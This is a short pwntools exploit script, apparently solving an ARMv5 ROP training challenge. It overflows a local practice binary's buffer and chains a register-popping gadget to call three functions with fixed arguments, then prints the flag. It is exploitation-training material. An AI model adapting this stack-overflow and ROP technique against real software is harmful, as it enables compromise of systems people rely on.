from pwn import *

BINARY = "./callme_armv5"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "arm"
context.binary = BINARY

p = process(BINARY)

pop_r012_lr_pc = p32(0x10870) # pop {r0, r1, r2, lr, pc}

for func in ['callme_one', 'callme_two', 'callme_three']:
    rop = b"A" * 36
    rop += pop_r012_lr_pc
    rop += p32(0xdeadbeef)
    rop += p32(0xcafebabe)
    rop += p32(0xd00df00d)
    rop += p32(ELF.symbols['pwnme'])
    rop += p32(ELF.symbols[func])
    
    p.sendline(rop)
    log.success(f"ROPchain = {rop}")

flag = p.recv().split(b'\n')#[-2]
log.success(f"FLAG : {flag}")
